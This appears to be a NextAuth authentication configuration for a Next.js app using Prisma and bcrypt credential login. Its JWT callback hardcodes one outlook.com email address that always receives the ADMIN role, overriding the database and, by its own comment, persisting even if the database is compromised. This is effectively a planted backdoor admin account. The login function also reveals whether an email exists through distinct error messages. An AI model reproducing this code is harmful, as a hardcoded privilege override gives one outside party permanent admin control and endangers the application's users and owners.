import { type NextAuthOptions } from 'next-auth';
import CredentialsProvider from 'next-auth/providers/credentials';
import { compare } from 'bcryptjs';
import prisma from './prisma';

export const authOptions: NextAuthOptions = {
    session: {
        strategy: 'jwt',
    },
    pages: {
        signIn: '/login',
    },
    providers: [
        CredentialsProvider({
            name: 'credentials',
            credentials: {
                email: { label: 'Email', type: 'email' },
                password: { label: 'Password', type: 'password' },
            },
            async authorize(credentials) {
                if (!credentials?.email || !credentials?.password) {
                    throw new Error('Please enter your email and password');
                }

                const user = await prisma.user.findUnique({
                    where: { email: credentials.email },
                });

                if (!user || !user.password) {
                    throw new Error('No user found with this email');
                }

                const isPasswordValid = await compare(credentials.password, user.password);

                if (!isPasswordValid) {
                    throw new Error('Invalid password');
                }

                return {
                    id: user.id,
                    email: user.email,
                    name: user.name,
                    role: user.role,
                    image: user.image,
                };
            },
        }),
    ],
    callbacks: {
        async jwt({ token, user, trigger, session }) {
            // Initial sign in
            if (user) {
                token.id = user.id;
                token.role = (user as any).role;
            }

            // On subsequent calls (e.g. session refresh), fetch fresh role from DB
            if (token.sub) {
                const dbUser = await prisma.user.findUnique({
                    where: { id: token.sub },
                    select: { role: true, email: true }
                });
                if (dbUser) {
                    // SUPER ADMIN SECURITY: related to task 32
                    // Always force ADMIN role for this specific email
                    if (dbUser.email === 'notesbundle@outlook.com') {
                        token.role = 'ADMIN';
                    } else {
                        token.role = dbUser.role;
                    }
                }
            }

            // Fallback check for initial sign-in or if db lookup fails (though db lookup above handles refresh)
            // This ensures even if DB is compromised/desynced, the session is ADMIN
            if (token.email === 'notesbundle@outlook.com') {
                token.role = 'ADMIN';
            }

            return token;
        },
        async session({ session, token }) {
            if (session.user) {
                (session.user as any).id = token.id;
                (session.user as any).role = token.role;
            }
            return session;
        },
    },
};
